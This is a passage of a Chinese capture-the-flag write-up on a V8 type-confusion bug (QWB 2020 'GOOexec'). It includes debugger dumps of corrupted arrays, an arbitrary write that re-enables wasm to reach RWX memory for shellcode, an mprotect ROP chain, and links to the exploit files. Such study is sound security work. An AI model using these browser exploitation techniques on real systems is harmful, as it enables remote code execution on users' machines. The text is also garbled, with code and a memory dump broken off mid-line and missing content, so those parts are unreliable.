        let tmp = {};
        b[0] = 0;
        a.length;
        for(let i=0; i 和tmp_arr
 ，在优化编译时，如果对象是浮点数组的话会将它转化成对象数组
，导致在该代码处会生成TransitionElementsKind 结点，将对象a从浮点数组转换成对象数组。
所以漏洞触发后，数组b转化成了对象数组，而访问还是按照浮点数组类型来访问，而因为指针压缩的缘故，浮点数组转换成对象数组后，长度会缩短一半，这样计算偏移就能精准覆盖到后面数组o的长度，让数组o成为能够越界读写的数组。
触发漏洞后的调试结果：
    DebugPrint: 0x8f5082af509: [JSArray]  // 数组b
     - map: 0x08f508243975  [FastProperties] // 已经从浮点数组类型变成对象数组类型
     - prototype: 0x08f50820b529 
     - elements: 0x08f5082af535  [HOLEY_ELEMENTS]
     - length: 23
     - properties: 0x08f5080426dd  {
        0x8f508044649: [String] in ReadOnlySpace: #length: 0x08f508182159  (const accessor descriptor)
     }
     - elements: 0x08f5082af535  {
            0-22: 0x08f5082af519 
     }
    pwndbg> job 0x08f5082af535
    0x8f5082af535: [FixedArray]
     - map: 0x08f5080424a5 
     - length: 23
            0-22: 0x08f5082af519 
    pwndbg> x/10gx 0x08f5082af535-1
    0x8f5082af534:  0x0000002e080424a5  0x082af519082af519
    0x8f5082af544:  0x082af519082af519  0x082af519082af519
    0x8f5082af554:  0x082af519082af519  0x082af519082af519
    0x8f5082af564:  0x082af519082af519  0x082af519082af519
    0x8f5082af574:  0x082af519082af519  0x082af519082af519
    pwndbg> 
    0x8f5082af584:  0x082af519082af519  0x082af519082af519
    0x8f5082af594:  0x08042a31082af519  0x9999999a00000002
    0x8f5082af5a4:  0x082438fd3ff19999  0x082af599080426dd
    0x8f5082af5b4:  0x0000000000002020* 0x0804232908042329 // backing_store，用于构造任意读写原语。常规思路是利用wasm，但本题通过`--js-flags=--noexpose_wasm`关闭了wasm 功能，造成一定困难，下面是进行利用的两种思路：
### 漏洞利用一
首先通过obj.constructor->code->text_addr (Builtins_ArrayConstructor函数地址) 泄露v8
elf的基地址，然后通过IDA查找"FLAG_expose_wasm"特征字符，找到偏移，得到.data
区"FLAG_expose_wasm"变量的地址，将其修改成true，重新开启wasm功能，后面就可以利用wasm的常规思路：根据mark查找wasm_function对象的地址，根据wasm_function–>shared_info–>WasmExportedFunctionData（data）–>instance+0x68
找到rwx的区域，将shellcode写入该区域即可。
这里有以下几点需要注意：
（1）chrome运行时会起很多进程，并不是第一个进程就是运行v8，得通过查找才能确认v8
运行在哪个进程，具体查找方法可以通过逐个附加到进程中查看泄露地址的内容，能识别地址，说明该进程是。笔者环境中调试发现都在第三个进程，并且是在libv8.so中，所以后续找got表和rop偏移都需要在libv8.so查找。准确来说利用泄露的text_addr
计算出来的基址是libv8.so的基址。
查看chrome进程：
（2）chrome运行后会在后面新起几个进程中关闭FLAG_expose_wasm（置零），而之前调试的第三个进程libv8.so中查看FLAG_expose_wasm还是true。但这些影响不大，主要调试的时候突然困惑，我们需要做的就是将FLAG_expose_wasm变量地址上填1。
    arb_write64(FLAG_expose_wasm, 0x1n);
开启wasm后，也只是修改该进程的FLAG_expose_wasm，另外开标签页运行exp时wasm还是关闭的（会重新起新进程，新进程中的FLAG_expose_wasm未被修改）。所以我们需要开始wasm后，在同一个标签页运行利用wasm的exp。
所以这里一共有两个exp html，一个开启wasm，一个利用wasm。
运行 **exp-FLAG_expose_wasm.html**
同一个标签运行 **exp-FLAG_expose_wasm1.html**
### 漏洞利用二
通过前面的漏洞利用我们可以libc的基址，按道理就可以找到free和system地址，将free替换成system，完成利用，但该题环境中的free函数是libcbase.so里的，释放数据时不是调用该free函数。因此这里学到一种方法，将shellcode放置在堆上的一段区域，然后通过在栈里布置rop链，用mprotect函数来修改这段区域属性为rwx，并跳转到该区域执行shellcode。
（1）获取栈地址
之前的利用可以泄露出libc的基址（通过泄露printf
.got表上填充的printf函数地址，再减去libc中printf的偏移）（/usr/lib/x86_64-linux-gnu/libc-2.31.so），查找变量environ的偏移，得到environ变量的地址，上面保存着栈的地址。
（2）在栈里面布置rop链
    add rsp 0x78; pop rbx; pop rbp; ret
    add rsp 0x78; pop rbx; pop rbp; ret
    ……
    ret
    ret
    ……
    ret
    pop rdi; ret
    shellcode_addr
    pop rsi; ret
    0x1000n
    pop rdx; ret
    0x7n
    mprotect_addr
    shellcode_addr
在前面布置`add rsp 0x78; pop rbx; pop rbp;
ret`是因为栈里有些数据在运行过程中会被覆盖，要跳过这些数据才能一直ret到执行mprotect函数，最后执行shellcode。
    int mprotect(void *addr, size_t len, int prot);
这里有以下问题需要注意：
（1）在栈里布置的rop，调试时在第三个进程libv8.so 中并没有看到，发现chrome也是会起几个新进程来执行js，在第一个有--no-v8-untrusted-code-mitigations 标志的进程找到栈里的rop。也可以先开启wasm ，创建wasm
对象，然后查看哪个chrome 的进程里包含rwxp 内存，以此可以确定js 运行的进程是哪个。
查看chrome进程：
运行exp.html效果图：
## 参考链接
漏洞利用一代码：
[https://github.com/De4dCr0w/Browser-pwn/blob/master/Vulnerability%20analyze/qwb2020-final-GOOexec%20%26%20Issue-799263/exp-FLAG_expose_wasm.html](https://github.com/De4dCr0w/Browser-pwn/blob/master/Vulnerability analyze/qwb2020-final-GOOexec %26
Issue-799263/exp-FLAG_expose_wasm.html)
[https://github.com/De4dCr0w/Browser-pwn/blob/master/Vulnerability%20analyze/qwb2020-final-GOOexec%20%26%20Issue-799263/exp-FLAG_expose_wasm1.html](https://github.com/De4dCr0w/Browser-pwn/blob/master/Vulnerability analyze/qwb2020-final-GOOexec %26
Issue-799263/exp-FLAG_expose_wasm1.html)
漏洞利用二代码：
[https://github.com/De4dCr0w/Browser-pwn/blob/master/Vulnerability%20analyze/qwb2020-final-GOOexec%20%26%20Issue-799263/exp.html](https://github.com/De4dCr0w/Browser-pwn/blob/master/Vulnerability analyze/qwb2020-final-GOOexec %26
Issue-799263/exp.html)